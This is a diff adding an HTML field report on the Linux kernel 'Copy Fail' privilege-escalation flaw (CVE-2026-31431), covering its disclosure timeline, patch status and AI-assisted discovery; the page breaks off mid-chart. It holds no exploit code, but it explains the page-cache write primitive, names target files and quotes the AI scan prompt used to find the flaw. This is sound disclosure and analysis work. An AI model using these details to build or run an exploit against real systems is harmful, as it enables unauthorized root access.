+  border: 1px solid var(--border-strong);
+  border-radius: 4px;
+  padding: 64px 48px;
+  position: relative;
+  text-align: center;
+  overflow: hidden;
+}
+@media (max-width: 768px) { .final-callout { padding: 40px 24px; } }
+
+.final-callout::before, .final-callout::after {
+  content: '';
+  position: absolute;
+  width: 200px; height: 200px;
+  border-radius: 50%;
+  filter: blur(80px);
+  pointer-events: none;
+}
+.final-callout::before {
+  background: var(--danger);
+  opacity: 0.15;
+  top: -100px;
+  left: -50px;
+}
+.final-callout::after {
+  background: var(--constructive);
+  opacity: 0.15;
+  bottom: -100px;
+  right: -50px;
+}
+
+.final-eyebrow {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 11px;
+  letter-spacing: 0.18em;
+  text-transform: uppercase;
+  color: var(--inflection);
+  margin-bottom: 24px;
+  position: relative; z-index: 2;
+}
+.final-text {
+  font-family: 'Fraunces', serif;
+  font-variation-settings: "opsz" 96, "SOFT" 30;
+  font-weight: 350;
+  font-style: italic;
+  font-size: clamp(22px, 3vw, 32px);
+  line-height: 1.35;
+  letter-spacing: -0.015em;
+  position: relative; z-index: 2;
+}
+
+/* SOURCES */
+.sources-section { background: var(--bg-elev); }
+.sources-section .section-title { font-size: clamp(28px, 4vw, 44px); }
+
+.sources-frame {
+  font-size: 15px;
+  line-height: 1.6;
+  color: var(--text-dim);
+  margin-bottom: 48px;
+  max-width: 70ch;
+}
+
+.sources-group { margin-bottom: 48px; }
+.sources-group-label {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 11px;
+  letter-spacing: 0.14em;
+  text-transform: uppercase;
+  color: var(--text-mute);
+  margin-bottom: 16px;
+  padding-bottom: 8px;
+  border-bottom: 1px solid var(--border);
+}
+.sources-list { list-style: none; }
+.sources-list li {
+  display: grid;
+  grid-template-columns: 32px 1fr;
+  gap: 16px;
+  padding: 14px 0;
+  border-bottom: 1px solid var(--border);
+  align-items: baseline;
+}
+.sources-list li:last-child { border-bottom: 0; }
+.src-num {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 11px;
+  color: var(--text-mute);
+  letter-spacing: 0.05em;
+}
+.src-body { font-size: 14.5px; line-height: 1.5; }
+.src-publisher { font-weight: 500; color: var(--text); }
+.src-title { color: var(--text-dim); font-style: italic; font-family: 'Fraunces', serif; font-size: 15px; }
+.src-meta {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 10px;
+  letter-spacing: 0.08em;
+  color: var(--text-mute);
+  text-transform: uppercase;
+  margin-top: 4px;
+}
+.src-link {
+  color: var(--constructive);
+  text-decoration: none;
+  border-bottom: 1px dotted var(--constructive);
+  word-break: break-all;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 11px;
+}
+.src-link:hover { color: var(--text); border-bottom-color: var(--text); }
+
+/* FOOTER */
+footer {
+  padding: 48px 0 32px;
+  border-top: 1px solid var(--border);
+  text-align: center;
+}
+footer p {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 11px;
+  letter-spacing: 0.16em;
+  text-transform: uppercase;
+  color: var(--text-mute);
+}
+footer a {
+  color: var(--text-dim);
+  text-decoration: none;
+  border-bottom: 1px dotted var(--text-mute);
+}
+footer a:hover { color: var(--text); border-bottom-color: var(--text); }
+
+/* SCROLL REVEAL */
+.reveal {
+  opacity: 0;
+  transform: translateY(24px);
+  transition: opacity 0.8s cubic-bezier(0.2, 0.8, 0.2, 1), transform 0.8s cubic-bezier(0.2, 0.8, 0.2, 1);
+}
+.reveal.in-view { opacity: 1; transform: translateY(0); }
+.reveal-delay-1 { transition-delay: 0.1s; }
+.reveal-delay-2 { transition-delay: 0.2s; }
+.reveal-delay-3 { transition-delay: 0.3s; }
+
+@media (prefers-reduced-motion: reduce) {
+  .reveal { opacity: 1; transform: none; transition: none; }
+  .pulse-dot, .marker-pulse, .scroll-pulse { animation: none !important; }
+}
+
+/* HERO SVG ANIMATIONS */
+.svg-glow {
+  filter: drop-shadow(0 0 24px rgba(255, 77, 61, 0.4));
+}
+.svg-dashed-circle {
+  fill: none;
+  stroke: var(--danger);
+  stroke-width: 1.5;
+  stroke-dasharray: 4 8;
+  animation: rotate-circle 60s linear infinite;
+  transform-origin: center;
+}
+@keyframes rotate-circle {
+  from { transform: rotate(0deg); }
+  to { transform: rotate(360deg); }
+}
+.svg-disk-band-1 { fill: var(--danger); opacity: 0.85; }
+.svg-disk-band-2 { fill: var(--inflection); opacity: 0.6; }
+.svg-disk-band-3 { fill: var(--constructive); opacity: 0.35; }
+
+.svg-scan-line {
+  stroke: var(--inflection);
+  stroke-width: 1;
+  opacity: 0.6;
+  animation: scan-move 4s ease-in-out infinite;
+}
+@keyframes scan-move {
+  0%, 100% { transform: translateY(-200px); opacity: 0; }
+  50% { opacity: 0.6; }
+  100% { transform: translateY(200px); opacity: 0; }
+}
+</style>
+</head>
+<body>
+
+<!-- THEME TOGGLE -->
+<button class="theme-toggle" id="themeToggle" aria-label="Toggle theme">
+  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+    <circle cx="12" cy="12" r="4"/>
+    <path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M4.93 19.07l1.41-1.41M17.66 6.34l1.41-1.41"/>
+  </svg>
+  <span id="themeLabel">Light</span>
+</button>
+
+<main>
+
+<!-- HERO -->
+<section class="hero">
+  <div class="container">
+    <div class="hero-meta">
+      <span><span class="dot"></span>AI Vulnerability Storm · Field Report 01</span>
+      <span>30 April 2026</span>
+      <span>CVE-2026-31431</span>
+      <span>CVSS 7.8 · High</span>
+    </div>
+
+    <h1 class="hero-title">Copy <em>Fail&nbsp;&nbsp;</em></h1>
+
+    <p class="hero-deck">A 732-byte Python script reaches root on every Linux distribution shipped since 2017 — surfaced by an AI-assisted scan in roughly an hour. The story isn't the bug. It's the window.</p>
+
+    <div class="hero-svg-wrap">
+      <svg class="svg-glow" viewBox="0 0 600 600" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+        <defs>
+          <radialGradient id="diskGlow" cx="50%" cy="50%" r="50%">
+            <stop offset="0%" stop-color="var(--danger)" stop-opacity="0.6"/>
+            <stop offset="100%" stop-color="var(--danger)" stop-opacity="0"/>
+          </radialGradient>
+        </defs>
+
+        <!-- Dashed target circle - intended landing -->
+        <g class="svg-dashed-circle-wrap">
+          <circle cx="200" cy="200" r="120" class="svg-dashed-circle"/>
+        </g>
+        <circle cx="200" cy="200" r="120" fill="none" stroke="var(--text-mute)" stroke-width="0.5" stroke-dasharray="2 4" opacity="0.4"/>
+
+        <!-- Cascading disks - the missed write -->
+        <circle cx="200" cy="200" r="90" class="svg-disk-band-3"/>
+        <circle cx="280" cy="280" r="90" class="svg-disk-band-2"/>
+        <circle cx="360" cy="360" r="90" class="svg-disk-band-1"/>
+
+        <!-- Scan line -->
+        <line x1="50" y1="300" x2="550" y2="300" class="svg-scan-line"/>
+
+        <!-- Crosshair markers -->
+        <g stroke="var(--text-dim)" stroke-width="0.5" opacity="0.4">
+          <line x1="200" y1="60" x2="200" y2="80"/>
+          <line x1="200" y1="320" x2="200" y2="340"/>
+          <line x1="60" y1="200" x2="80" y2="200"/>
+          <line x1="320" y1="200" x2="340" y2="200"/>
+        </g>
+
+        <!-- Coordinate annotations -->
+        <text x="200" y="45" text-anchor="middle" font-family="JetBrains Mono" font-size="9" fill="var(--text-mute)" letter-spacing="2">INTENDED dst[</text>
+        <text x="380" y="430" font-family="JetBrains Mono" font-size="9" fill="var(--danger)" letter-spacing="2">ACTUAL dst[assoclen + cryptlen]</text>
+
+        <!-- Annotation lines -->
+        <path d="M 360 360 L 360 410" stroke="var(--danger)" stroke-width="0.5" stroke-dasharray="2 2" opacity="0.6"/>
+      </svg>
+    </div>
+  </div>
+
+  <div class="hero-scroll-prompt">Scroll</div>
+</section>
+
+<!-- STAT GRID -->
+<section>
+  <div class="container">
+    <div class="eyebrow"><span class="eyebrow-num">01</span>By the numbers</div>
+    <h2 class="section-title reveal">The shape of the disclosure.</h2>
+    <p class="section-lede reveal reveal-delay-1">Six numbers. Each one sourced. Each one tells you something distinct about how this incident moved.</p>
+
+    <div class="stat-grid">
+      <div class="stat-cell reveal">
+        <div class="stat-num">732<span class="unit">bytes</span></div>
+        <div class="stat-label">Universal exploit, Python 3.10+ stdlib only</div>
+        <div class="stat-source">Source [1, 2]</div>
+      </div>
+      <div class="stat-cell reveal reveal-delay-1">
+        <div class="stat-num">~1<span class="unit">hour</span></div>
+        <div class="stat-label">Xint Code scan time, one operator prompt</div>
+        <div class="stat-source">Source [1, 2, 7]</div>
+      </div>
+      <div class="stat-cell reveal reveal-delay-2">
+        <div class="stat-num">~9<span class="unit">years</span></div>
+        <div class="stat-label">Silent exposure window since kernel 4.14 (Jul 2017)</div>
+        <div class="stat-source">Source [2, 5]</div>
+      </div>
+      <div class="stat-cell reveal">
+        <div class="stat-num">9<span class="unit">days</span></div>
+        <div class="stat-label">Researcher report → mainline kernel patch</div>
+        <div class="stat-source">Source [1, 2, 4]</div>
+      </div>
+      <div class="stat-cell reveal reveal-delay-1">
+        <div class="stat-num">7.8<span class="unit">CVSS</span></div>
+        <div class="stat-label">Official severity (operationally higher in multi-tenant)</div>
+        <div class="stat-source">Source [3, 4]</div>
+      </div>
+      <div class="stat-cell reveal reveal-delay-2">
+        <div class="stat-num">4<span class="unit">distros</span></div>
+        <div class="stat-label">Ubuntu, Amazon Linux, RHEL, SUSE — same exploit</div>
+        <div class="stat-source">Source [1, 2]</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- WHAT CHANGED — conceptual frame -->
+<section>
+  <div class="container">
+    <div class="eyebrow"><span class="eyebrow-num">02</span>What changed</div>
+    <h2 class="section-title reveal">The storm is the topic. Copy Fail is the evidence.</h2>
+
+    <div class="frame-grid">
+      <div class="frame-card reveal">
+        <div class="frame-label">Cost to discover</div>
+        <div class="frame-before">$$$$<span class="frame-mute"> · weeks of senior researcher time</span></div>
+        <div class="frame-arrow">→</div>
+        <div class="frame-after">$<span class="frame-mute"> · ~1 hour, one operator prompt</span></div>
+      </div>
+      <div class="frame-card reveal reveal-delay-1">
+        <div class="frame-label">Time to public PoC after disclosure</div>
+        <div class="frame-before">Weeks <span class="frame-mute">to months</span></div>
+        <div class="frame-arrow">→</div>
+        <div class="frame-after">Hours<span class="frame-mute"> · or zero (PoC published with disclosure)</span></div>
+      </div>
+      <div class="frame-card reveal reveal-delay-2">
+        <div class="frame-label">Reports landing on maintainer queues</div>
+        <div class="frame-before">~2 / week</div>
+        <div class="frame-arrow">→</div>
+        <div class="frame-after">~10 / week<span class="frame-mute"> · LLM-assisted, often duplicating</span></div>
+      </div>
+      <div class="frame-card reveal reveal-delay-3">
+        <div class="frame-label">Defender response cadence</div>
+        <div class="frame-before">Quarterly maintenance windows</div>
+        <div class="frame-arrow">→</div>
+        <div class="frame-after">Continuous<span class="frame-mute"> · or the gap is your operating reality</span></div>
+      </div>
+    </div>
+
+    <p class="frame-thesis reveal">Each row is its own asymmetry. Stack them, and the new operating environment comes into focus: discovery accelerates faster than disclosure, disclosure accelerates faster than backporting, backporting accelerates faster than enterprise deployment. The compound effect is the Storm. Copy Fail is one disclosure inside it — the rest of this report is what to do about the Storm itself.</p>
+  </div>
+</section>
+
+<!-- PULLQUOTE 1 -->
+<section class="pullquote">
+  <div class="pullquote-inner reveal">
+    <span class="pullquote-mark">"</span>
+    <p class="pullquote-text">Even the most simplistic synthetic benchmarks on LLM's ability to produce correct <em>and</em> secure code at the same time are sitting at the coin flip range today. Meaning the efficiency gains in reporting vulnerabilities will be asymmetric with the ability to address them.</p>
+    <p class="pullquote-attr"><strong>Greg Kroah-Hartman</strong> · Linux Kernel Maintainer · oss-security mailing list, 28–29 April 2026 · Source [10]</p>
+  </div>
+</section>
+
+<!-- TIMELINE -->
+<section>
+  <div class="container">
+    <div class="eyebrow"><span class="eyebrow-num">03</span>Timeline</div>
+    <h2 class="section-title reveal">Six years of latent risk. Thirty-seven days of disclosure.</h2>
+    <p class="section-lede reveal reveal-delay-1">From public PoC to community reproduction: hours. Click any event for the underlying detail and source. Confidence is graded against source strength.</p>
+
+    <div class="timeline">
+
+      <div class="phase-label">
+        <div class="phase-label-spine"></div>
+        <div class="phase-label-text">Phase 1 · Pre-incident conditions</div>
+      </div>
+
+      <div class="tl-event tl-left reveal" data-expand>
+        <div></div>
+        <div class="tl-spine-marker"></div>
+        <div class="tl-content" tabindex="0" role="button" aria-expanded="false">
+          <div class="tl-meta"><span class="tl-date">2011</span><span class="tl-phase">Pre-incident</span></div>
+          <h3 class="tl-title">authencesn AEAD wrapper added to kernel</h3>
+          <p class="tl-summary">RFC 4303 IPsec ESN support. Uses caller's destination buffer as scratch space — harmless under the AEAD interface as it existed in 2011.</p>
+          <div class="tl-detail">Commit <span class="mono">a5079d084f8b</span>. Under the old AEAD interface, associated data lived in a separate scatterlist, and the only caller was the kernel's own xfrm/IPsec layer. No userspace ever observed the intermediate writes. The decision was reasonable on its own terms.<span class="cite">Source [2] · Confidence: Confirmed</span></div>
+          <span class="tl-expand">Expand detail</span>
+        </div>
+      </div>
+
+      <div class="tl-event tl-right reveal">
+        <div></div>
+        <div class="tl-spine-marker"></div>
+        <div class="tl-content" tabindex="0" role="button" aria-expanded="false">
+          <div class="tl-meta"><span class="tl-date">2015</span><span class="tl-phase">Pre-incident</span></div>
+          <h3 class="tl-title">AF_ALG gains AEAD support; authencesn migrated</h3>
+          <p class="tl-summary">algif_aead.c added — exposes kernel's AEAD ciphers to unprivileged userspace via AF_ALG sockets. Out-of-place operation kept page cache pages out of the writable destination.</p>
+          <div class="tl-detail">In the same year authencesn was converted to the new AEAD interface (commit <span class="mono">104880a6b470</span>), introducing the <span class="mono">assoclen + cryptlen</span> offset that writes past the contracted output boundary. Still safe because <span class="mono">req->src</span> and <span class="mono">req->dst</span> were separate scatterlists. Page cache pages from <span class="mono">splice()</span> lived in src (read-only); the scratch write went to dst (the user's buffer). Not yet exploitable.<span class="cite">Source [2] · Confidence: Confirmed</span></div>
+          <span class="tl-expand">Expand detail</span>
+        </div>
+      </div>
+
+      <div class="tl-event tl-left reveal danger-event">
+        <div></div>
+        <div class="tl-spine-marker"></div>
+        <div class="tl-content" tabindex="0" role="button" aria-expanded="false">
+          <div class="tl-meta"><span class="tl-date">Jul 2017 · kernel 4.14</span><span class="tl-phase">Pre-incident</span></div>
+          <h3 class="tl-title">In-place optimization added to algif_aead.c — the bug is born</h3>
+          <p class="tl-summary">Performance optimization chains tag pages by reference using sg_chain(); req->src = req->dst. Page cache pages from splice() are now in the writable destination scatterlist.</p>
+          <div class="tl-detail">Commit <span class="mono">72548b093ee3</span>. The intersection of three reasonable changes — the 2011 authencesn scratch-write convention, the 2015 AF_ALG splice path, and this 2017 in-place optimization — creates the bug. Each change reasonable in isolation; nobody connected the optimization to authencesn's scratch writes or to splice()'s use of page cache pages.<span class="cite">Source [2, 5, 8] · Confidence: Confirmed</span></div>
+          <span class="tl-expand">Expand detail</span>
+        </div>
+      </div>
+
+      <div class="tl-event tl-right reveal">
+        <div></div>
+        <div class="tl-spine-marker"></div>
+        <div class="tl-content" tabindex="0" role="button" aria-expanded="false">
+          <div class="tl-meta"><span class="tl-date">2017 → 2026</span><span class="tl-phase">Pre-incident</span></div>
+          <h3 class="tl-title">≈9 years of silent exposure</h3>
+          <p class="tl-summary">The vulnerability ships in essentially every Linux kernel and every major distribution. crypto/ is heavily reviewed — but for cryptographic properties, not for memory provenance.</p>
+          <div class="tl-detail">Bugcrowd's analysis articulates the structural reason: "crypto/ is heavily reviewed from a crypto lens, looking for properties like IND-CPA security, side channels, and parameter validation. Copy Fail is fundamentally about where the memory came from and whether the kernel should ever be writing through it. That's a different type of question."<span class="cite">Source [2, 7] · Confidence: Reported</span></div>
+          <span class="tl-expand">Expand detail</span>
+        </div>
+      </div>
+
+      <div class="phase-label">
+        <div class="phase-label-spine"></div>
+        <div class="phase-label-text">Phase 2 · Discovery (researchers, not attackers)</div>
+      </div>
+
+      <div class="tl-event tl-left reveal inflection-event">
+        <div></div>
+        <div class="tl-spine-marker"></div>
+        <div class="tl-content" tabindex="0" role="button" aria-expanded="false">
+          <div class="tl-meta"><span class="tl-date">~Mar 2026 · pre-23rd</span><span class="tl-phase">Discovery</span></div>
+          <h3 class="tl-title">Human insight + AI scan surface the bug</h3>
+          <p class="tl-summary">Theori researcher Taeyang Lee provides the conceptual key as an operator prompt; Xint Code scans the crypto/ subsystem in ~1 hour. Copy Fail is the highest-severity finding.</p>
+          <div class="tl-detail">The operator prompt: <em>"This is the linux crypto/ subsystem. Please examine all codepaths reachable from userspace syscalls. Note one key observation: splice() can deliver page-cache references of read-only files (including setuid binaries) to crypto TX scatterlists."</em> The scan ran ~1 hour. Same scan also surfaced additional high-severity findings still in coordinated disclosure. Lee's earlier kernelCTF work mapping the AF_ALG attack surface is what made the prompt possible — neither understating the AI's role nor overstating it.<span class="cite">Source [2, 7] · Confidence: Reported</span></div>
+          <span class="tl-expand">Expand detail</span>
+        </div>
+      </div>
+
+      <div class="phase-label">
+        <div class="phase-label-spine"></div>
+        <div class="phase-label-text">Phase 3 · Coordinated disclosure begins</div>
+      </div>
+
+      <div class="tl-event tl-right confirmed reveal">
+        <div></div>
+        <div class="tl-spine-marker"></div>
+        <div class="tl-content" tabindex="0" role="button" aria-expanded="false">
+          <div class="tl-meta"><span class="tl-date">2026-03-23</span><span class="tl-phase">Disclosure</span></div>
+          <h3 class="tl-title">Vulnerability reported to Linux kernel security team</h3>
+          <p class="tl-summary">Theori submits report via security@kernel.org. The 732-byte exploit demonstrating universal reliability is included.</p>
+          <div class="tl-detail">Standard kernel security disclosure pipeline. Report includes the technical mechanism, affected kernel range, and a working proof of concept.<span class="cite">Source [1, 2, 4] · Confidence: Confirmed</span></div>
+          <span class="tl-expand">Expand detail</span>
+        </div>
+      </div>
+
+      <div class="tl-event tl-left confirmed reveal">
+        <div></div>
+        <div class="tl-spine-marker"></div>
+        <div class="tl-content" tabindex="0" role="button" aria-expanded="false">
+          <div class="tl-meta"><span class="tl-date">2026-03-24 · +1 day</span><span class="tl-phase">Disclosure</span></div>
+          <h3 class="tl-title">Initial acknowledgment received</h3>
+          <p class="tl-summary">One-day turnaround on initial acknowledgment from the kernel security team.</p>
+          <div class="tl-detail">By any historical measure, this is fast. The kernel security team's response cadence here is the good news in the story.<span class="cite">Source [1, 2] · Confidence: Confirmed</span></div>
+          <span class="tl-expand">Expand detail</span>
+        </div>
+      </div>
+
+      <div class="tl-event tl-right confirmed reveal">
+        <div></div>
+        <div class="tl-spine-marker"></div>
+        <div class="tl-content" tabindex="0" role="button" aria-expanded="false">
+          <div class="tl-meta"><span class="tl-date">2026-03-25 · +2 days</span><span class="tl-phase">Disclosure</span></div>
+          <h3 class="tl-title">Patches proposed and reviewed</h3>
+          <p class="tl-summary">Within 48 hours of acknowledgment, Herbert Xu's proposed fix is in review on kernel security channels.</p>
+          <div class="tl-detail">The fix reverts the 2017 in-place optimization entirely. Becomes commit <span class="mono">a664bf3d603d</span> when committed.<span class="cite">Source [1, 2] · Confidence: Confirmed</span></div>
+          <span class="tl-expand">Expand detail</span>
+        </div>
+      </div>
+
+      <div class="tl-event tl-left confirmed inflection-event reveal">
+        <div></div>
+        <div class="tl-spine-marker"></div>
+        <div class="tl-content" tabindex="0" role="button" aria-expanded="false">
+          <div class="tl-meta"><span class="tl-date">2026-04-01 · +9 days</span><span class="tl-phase">Disclosure</span></div>
+          <h3 class="tl-title">Mainline patch committed</h3>
+          <p class="tl-summary">Herbert Xu's fix lands in mainline. Reverts in-place AEAD operation. Fixes: tag points to the 2017 commit.</p>
+          <div class="tl-detail">Commit message: <em>"There is no benefit in operating in-place in algif_aead since the source and destination come from different mappings."</em> 9 days from report to mainline patch is fast by any historical measure.<span class="cite">Source [1, 2, 4, 5] · Confidence: Confirmed</span></div>
+          <span class="tl-expand">Expand detail</span>
+        </div>
+      </div>
+
+      <div class="tl-event tl-right confirmed reveal">
+        <div></div>
+        <div class="tl-spine-marker"></div>
+        <div class="tl-content" tabindex="0" role="button" aria-expanded="false">
+          <div class="tl-meta"><span class="tl-date">2026-04-11 · +19 days</span><span class="tl-phase">Disclosure</span></div>
+          <h3 class="tl-title">Stable backports for 6.18.x and 6.19.x</h3>
+          <p class="tl-summary">Kernels 6.18.22 and 6.19.12 released with the fix backported. Longterm series 6.12, 6.6, 6.1, 5.15, 5.10 do not yet receive the fix.</p>
+          <div class="tl-detail">Eddie Chapman on oss-security: <em>"backporting that far back is not as straightforward."</em> Legitimate engineering work, not negligence — the longterm-stable model trades patch latency for stability, and that trade has held up for years.<span class="cite">Source [4, 8, 9] · Confidence: Confirmed</span></div>
+          <span class="tl-expand">Expand detail</span>
+        </div>
+      </div>
+
+      <div class="tl-event tl-left confirmed reveal">
+        <div></div>
+        <div class="tl-spine-marker"></div>
+        <div class="tl-content" tabindex="0" role="button" aria-expanded="false">
+          <div class="tl-meta"><span class="tl-date">2026-04-22 · +30 days</span><span class="tl-phase">Disclosure</span></div>
+          <h3 class="tl-title">CVE-2026-31431 assigned</h3>
+          <p class="tl-summary">CVE identifier issued. CVSSv3 score: 7.8 (High).</p>
+          <div class="tl-detail">Standard CNA process; identifier issued ahead of the planned public disclosure window.<span class="cite">Source [1, 2, 4] · Confidence: Confirmed</span></div>
+          <span class="tl-expand">Expand detail</span>
+        </div>
+      </div>
+
+      <div class="tl-event tl-right confirmed inflection-event reveal">
+        <div></div>
+        <div class="tl-spine-marker"></div>
+        <div class="tl-content" tabindex="0" role="button" aria-expanded="false">
+          <div class="tl-meta"><span class="tl-date">2026-04-28 · +36 days</span><span class="tl-phase">Disclosure</span></div>
+          <h3 class="tl-title">"Coordinated Disclosure in the LLM Age" thread opens</h3>
+          <p class="tl-summary">Jeremy Stanley (OpenStack VMT) opens a parallel thread on oss-security questioning whether traditional embargoes remain viable when LLM-assisted rediscovery is routine.</p>
+          <div class="tl-detail">Greg Kroah-Hartman and Clemens Lang (Red Hat) respond. Lang reports: <em>"We're seeing duplicate reports of the same issue found by multiple independent groups that use LLMs, within the embargo period."</em> The thread overlaps Copy Fail's disclosure window — the same kernel maintainers receiving the deluge of LLM-assisted reports are openly grappling with the structural problem.<span class="cite">Source [10] · Confidence: Confirmed</span></div>
+          <span class="tl-expand">Expand detail</span>
+        </div>
+      </div>
+
+      <div class="tl-event tl-left confirmed danger-event reveal">
+        <div></div>
+        <div class="tl-spine-marker"></div>
+        <div class="tl-content" tabindex="0" role="button" aria-expanded="false">
+          <div class="tl-meta"><span class="tl-date">2026-04-29 · +37 days</span><span class="tl-phase">Public</span></div>
+          <h3 class="tl-title">Public disclosure</h3>
+          <p class="tl-summary">copy.fail, Xint Code technical writeup, and 732-byte exploit on GitHub all go live. Jan Schaumann posts to oss-security at 16:23 EDT.</p>
+          <div class="tl-detail">PoC SHA-256: <span class="mono" style="word-break:break-all;font-size:11px;">a567d09b15f6e4440e70c9f2aa8edec8ed59f53301952df05c719aa3911687f9</span>. From researcher report to public disclosure with working PoC: 37 days.<span class="cite">Source [1, 2, 8] · Confidence: Confirmed</span></div>
+          <span class="tl-expand">Expand detail</span>
+        </div>
+      </div>
+
+      <div class="tl-event tl-right danger-event reveal">
+        <div></div>
+        <div class="tl-spine-marker"></div>
+        <div class="tl-content" tabindex="0" role="button" aria-expanded="false">
+          <div class="tl-meta"><span class="tl-date">2026-04-29 · same day</span><span class="tl-phase">Reproduction</span></div>
+          <h3 class="tl-title">Community reproduction begins within hours</h3>
+          <p class="tl-summary">Solar Designer (Openwall founder) confirms exploit on Rocky Linux 9.7. Independent detector and alternate /etc/passwd-targeting exploit appear at github.com/rootsecdev within 24 hours.</p>
+          <div class="tl-detail">From public disclosure to public reproduction: <strong>hours, not days</strong>. The alternate exploit retargets the same 4-byte page-cache primitive at <span class="mono">/etc/passwd</span> instead of <span class="mono">/usr/bin/su</span> — same primitive, different target file, same outcome. Material evidence of the speed at which exploit derivatives appear post-disclosure.<span class="cite">Source [6, 9, 12] · Confidence: Confirmed</span></div>
+          <span class="tl-expand">Expand detail</span>
+        </div>
+      </div>
+
+      <div class="phase-label">
+        <div class="phase-label-spine"></div>
+        <div class="phase-label-text">Phase 4 · Response & ongoing state</div>
+      </div>
+
+      <div class="tl-event tl-left reveal">
+        <div></div>
+        <div class="tl-spine-marker"></div>
+        <div class="tl-content" tabindex="0" role="button" aria-expanded="false">
+          <div class="tl-meta"><span class="tl-date">2026-04-30 09:25 UTC</span><span class="tl-phase">Response</span></div>
+          <h3 class="tl-title">CERT-EU advisory issued; vendor backporting active</h3>
+          <p class="tl-summary">CERT-EU snapshot: no enterprise distro had a fully shipped patched kernel that morning. Tenable's later-day snapshot: Ubuntu/SUSE/Red Hat "Patching"; Debian, Amazon Linux still vulnerable; Arch Linux patched.</p>
+          <div class="tl-detail">The two snapshots are consistent — both correct as-of moments hours apart. Arch Linux tracks mainline closely and patched fastest; enterprise distros backport across longterm series and take longer. The window itself is the story.<span class="cite">Source [3, 4] · Confidence: Confirmed</span></div>
+          <span class="tl-expand">Expand detail</span>
+        </div>
+      </div>
+
+      <div class="tl-event tl-right reveal">
+        <div></div>
+        <div class="tl-spine-marker"></div>
+        <div class="tl-content" tabindex="0" role="button" aria-expanded="false">
+          <div class="tl-meta"><span class="tl-date">Ongoing</span><span class="tl-phase">Open</span></div>
+          <h3 class="tl-title">Open items as of report's as-of date</h3>
+          <p class="tl-summary">Backports for longterm series 6.12, 6.6, 6.1, 5.15, 5.10 not yet landed. Several enterprise distros still shipping. Theori's Part 2 (Kubernetes container escape) not yet published. Additional related findings still under coordinated disclosure.</p>
+          <div class="tl-detail">CVE-2026-31431 not listed in CISA KEV as of 30 April. Tenable classifies as "Vulnerability of Interest" under Vulnerability Watch given the public PoC and historical KEV-listing of comparable Linux LPEs (Dirty Cow, Dirty Pipe). No public reports of in-the-wild exploitation as of the report's as-of date — but the precedent of comparable LPEs entering KEV after disclosure is clear.<span class="cite">Source [4, 9] · Confidence: Confirmed</span></div>
+          <span class="tl-expand">Expand detail</span>
+        </div>
+      </div>
+
+    </div>
+  </div>
+</section>
+
+<!-- THE ASYMMETRY CHART -->
+<section>
+  <div class="container">
+    <div class="eyebrow"><span class="eyebrow-num">04</span>The asymmetry, visualized</div>
+    <h2 class="section-title reveal">Defenders climb. Attackers jump.</h2>
+    <p class="section-lede reveal reveal-delay-1">Patch coverage propagates gradually — mainline, then newest stable, then enterprise distros, then fleets. Public exploit availability is binary — either no PoC exists, or it does, and full reproduction follows in hours. Plot both lines on the same timeline and the shape of the modern disclosure window comes into focus.</p>
+
+    <div class="patch-chart-wrap reveal">
+      <svg class="patch-chart-svg" viewBox="0 0 1100 460" xmlns="http://www.w3.org/2000/svg" aria-label="Asymmetric defender vs attacker coverage chart for Copy Fail">
+        <defs>
+          <linearGradient id="exposeGrad" x1="0%" y1="0%" x2="0%" y2="100%">
+            <stop offset="0%" stop-color="var(--danger)" stop-opacity="0.28"/>
+            <stop offset="100%" stop-color="var(--danger)" stop-opacity="0.05"/>
+          </linearGradient>
+          <linearGradient id="defGrad" x1="0%" y1="0%" x2="0%" y2="100%">
+            <stop offset="0%" stop-color="var(--constructive)" stop-opacity="0.22"/>
+            <stop offset="100%" stop-color="var(--constructive)" stop-opacity="0.02"/>
+          </linearGradient>
+          <pattern id="dangerHatch" width="6" height="6" patternUnits="userSpaceOnUse" patternTransform="rotate(45)">
+            <line x1="0" y1="0" x2="0" y2="6" stroke="var(--danger)" stroke-width="0.8" opacity="0.35"/>
+          </pattern>
+        </defs>
+
+        <!-- Y axis grid lines -->
+        <g stroke="var(--border)" stroke-width="0.5" opacity="0.4">
+          <line x1="80" y1="60" x2="1040" y2="60"/>
+          <line x1="80" y1="140" x2="1040" y2="140"/>
+          <line x1="80" y1="220" x2="1040" y2="220"/>
+          <line x1="80" y1="300" x2="1040" y2="300"/>
+        </g>
+
+        <!-- Y axis labels -->
+        <g font-family="JetBrains Mono" font-size="9" fill="var(--text-mute)" letter-spacing="1" text-anchor="end">
+          <text x="72" y="64">100%</text>
+          <text x="72" y="144">75%</text>
+          <text x="72" y="224">50%</text>
+          <text x="72" y="304">25%</text>
+          <text x="72" y="384">0%</text>
+        </g>
+
+        <!-- Y axis label -->
+        <text x="20" y="220" font-family="JetBrains Mono" font-size="10" fill="var(--text-dim)" letter-spacing="2" transform="rotate(-90 20 220)" text-anchor="middle">% COVERAGE</text>
+
+        <!-- X axis line -->
+        <line x1="80" y1="380" x2="1040" y2="380" stroke="var(--border-strong)" stroke-width="1"/>
+
+        <!-- X axis ticks and labels -->
+        <g font-family="JetBrains Mono" font-size="9" fill="var(--text-mute)" letter-spacing="1" text-anchor="middle">
+          <line x1="100" y1="378" x2="100" y2="384" stroke="var(--text-mute)"/>
+          <text x="100" y="400">DAY 0</text>
+          <text x="100" y="414" font-size="8">Mar 23 · report</text>
+
+          <line x1="306" y1="378" x2="306" y2="384" stroke="var(--text-mute)"/>
+          <text x="306" y="400">DAY 9</text>
+          <text x="306" y="414" font-size="8">mainline patch</text>
+
+          <line x1="535" y1="378" x2="535" y2="384" stroke="var(--text-mute)"/>
+          <text x="535" y="400">DAY 19</text>
+          <text x="535" y="414" font-size="8">newest stable</text>
+
+          <line x1="788" y1="378" x2="788" y2="384" stroke="var(--text-mute)"/>
+          <text x="788" y="400">DAY 30</text>
+          <text x="788" y="414" font-size="8">CVE assigned</text>
+
+          <line x1="950" y1="378" x2="950" y2="384" stroke="var(--text-mute)"/>
+          <text x="950" y="400">DAY 37</text>
+          <text x="950" y="414" font-size="8">public PoC</text>
+        </g>
+
